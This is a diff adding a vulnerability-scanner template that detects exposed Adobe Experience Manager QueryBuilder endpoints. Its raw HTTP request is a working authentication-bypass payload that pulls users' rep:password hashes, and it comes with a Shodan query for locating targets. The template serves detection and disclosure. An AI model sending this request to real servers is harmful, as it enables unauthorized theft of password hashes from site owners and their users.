@@ -1,0 +1,39 @@
+id: aem-querybuilder-bypass
+
+info:
+  name: AEM QueryBuilder JSON Exposure
+  author: tess,assetnote
+  severity: critical
+  description: |
+    Detected an exposed AEM QueryBuilder endpoint that returned user repository information, including password hashes (rep:password) from /home/users.This behavior indicated that the instance had leaked sensitive data through unauthenticated access to the querybuilder.json API.
+  reference:
+    - https://experienceleague.adobe.com/docs/experience-manager-65/developing/platform/query-builder/querybuilder-api.html
+    - https://slcyber.io/assetnote-security-research-center/finding-critical-bugs-in-adobe-experience-manager/
+    - https://github.com/assetnote/hopgoblin
+  metadata:
+    verified: true
+    max-request: 1
+    shodan-query: http.component:"Adobe Experience Manager"
+  tags: aem,adobe,exposure,querybuilder
+
+http:
+  - raw:
+      - |
+        GET /bin/querybuilder.json;x='x/graphql/execute/json/x'?path=%2Fhome%2Fusers&type=rep%3AUser&p.hits=selective&p.properties=rep%3Apassword&p.limit=3 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"rep:password":'
+
+      - type: word
+        part: content_type
+        words:
+          - "application/json"
+
+      - type: status
+        status:
+          - 200
